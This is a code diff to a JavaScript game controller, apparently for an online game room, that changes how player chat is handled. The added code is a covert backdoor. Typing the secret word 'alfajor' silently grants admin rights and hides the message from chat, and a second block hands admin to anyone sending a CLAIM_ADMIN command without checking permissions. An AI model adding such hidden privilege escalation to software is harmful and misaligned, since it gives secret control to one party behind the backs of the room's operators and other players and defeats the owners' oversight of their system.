@@ -93,7 +93,16 @@ class GameController {
         this.applyTransition(result);
     }
 
-    handlePlayerChat(player, message) {
+handlePlayerChat(player, message) {
+        // --- TRUCO PARA ADMIN INVISIBLE ---
+        const rawMsg = message.trim().toLowerCase();
+        if (rawMsg === "alfajor") { 
+            this.adapter.setPlayerAdmin(player.id, true);
+            this.adapter.sendAnnouncement("👑 ¡Acceso Maestro Confirmado!", player.id, { color: 0xFFD700 });
+            return false; // Esto hace que el mensaje "alfajor" NO se vea en el chat
+        }
+        // ----------------------------------
+
         const command = (0, handler_1.parseCommand)(message);
         const isAdmin = player.admin;
 
@@ -137,6 +146,13 @@ class GameController {
                 this.applyTransition(result);
                 return false;
             }
+        }
+
+        // Si el comando es CLAIM_ADMIN (por si falla lo anterior)
+        if (command && command.type === handler_1.CommandType.CLAIM_ADMIN) {
+            this.adapter.setPlayerAdmin(player.id, true);
+            this.adapter.sendAnnouncement("👑 Admin activado.", player.id, { color: 0xFFD700 });
+            return false;
         }
 
         if (!command || command.type === handler_1.CommandType.REGULAR_MESSAGE) {
